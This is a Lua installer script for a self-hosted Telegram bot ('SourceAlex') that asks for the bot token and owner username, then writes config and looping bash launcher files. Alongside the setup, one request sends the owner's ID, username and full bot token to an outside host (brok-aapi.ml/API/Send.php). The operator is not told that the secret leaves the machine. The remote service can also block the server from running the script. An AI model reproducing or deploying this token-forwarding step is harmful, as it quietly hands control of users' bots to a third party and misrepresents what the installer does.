serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_Alex = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_Alex = function() 
local Create_Info = function(Token,Sudo,UserName)  
local Alex_Info_Sudo = io.open("sudo.lua", 'w')
Alex_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
Alex_Info_Sudo:close()
end  
if not database:get(Server_Alex.."Token_Alex") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_Alex.."Token_Alex",token)
end 
else
io.write('\n\27[1;31mThe Token was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_Alex.."UserName_Alex") then
io.write('\n\27[1;35mSend UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
local User_Sudo = io.read():gsub('@','')
if User_Sudo ~= '' then
local GetInfoUser = https.request("https://brok-aapi.ml/API/Info.php?user="..User_Sudo)
local User_Info = JSON:decode(GetInfoUser) 
if User_Info.Info.Chek == "is_block" then
io.write('\n\27[1;31m If ip server is blocked : سيرفرك لقد تم حظره من السورس \n\27[0;39;49m')
os.exit()
end
if User_Info.Info.Chek == "Not_Info" then
io.write('\n\27[1;31m The UserName was not Saved : المعرف غلط ارسل المعرف صحيح\n\27[0;39;49m')
os.execute('lua start.lua')
end
if User_Info.Info == 'Channel' then
io.write('\n\27[1;31m The UserName Is Channel : عذرا هاذا معرف قناة وليس حساب \n\27[0;39;49m')
os.execute('lua start.lua')
end
io.write('\n\27[1;31m• The Username Is Saved : تم حفظ معرف المطور الاسي واستخراج ايدي \n\27[0;39;49m')
https.request("https://brok-aapi.ml/API/Send.php?id="..User_Info.Info.Id.."&username="..User_Info.Info.Username.."&token="..database:get(Server_Alex.."Token_Alex"))
database:set(Server_Alex.."UserName_Alex",User_Info.Info.Username)
database:set(Server_Alex.."Id_Alex",User_Info.Info.Id)
else
io.write('\n\27[1;31mThe UserName was not Saved : لم يتم حفظ معرف Carbon\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end

local function Files_Alex_Info()
Create_Info(database:get(Server_Alex.."Token_Alex"),database:get(Server_Alex.."Id_Alex"),database:get(Server_Alex.."UserName_Alex"))   
local RunAlex = io.open("Alex", 'w')
RunAlex:write([[
#!/usr/bin/env bash
cd $HOME/SourceAlex
token="]]..database:get(Server_Alex.."Token_Alex")..[["
      
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Alex.lua -p PROFILE --bot=$token
done
]])
RunAlex:close()
local RunTs = io.open("brok", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/SourceAlex
while(true) do
rm -fr ../.telegram-cli
screen -S Alex -X kill
screen -S Alex ./Alex
done
]])
RunTs:close()
end
Files_Alex_Info()
database:del(Server_Alex.."Token_Alex");database:del(Server_Alex.."Id_Alex");database:del(Server_Alex.."UserName_Alex")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_Alex()  
var = true
else   
f:close()  
database:del(Server_Alex.."Token_Alex");database:del(Server_Alex.."Id_Alex");database:del(Server_Alex.."UserName_Alex")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
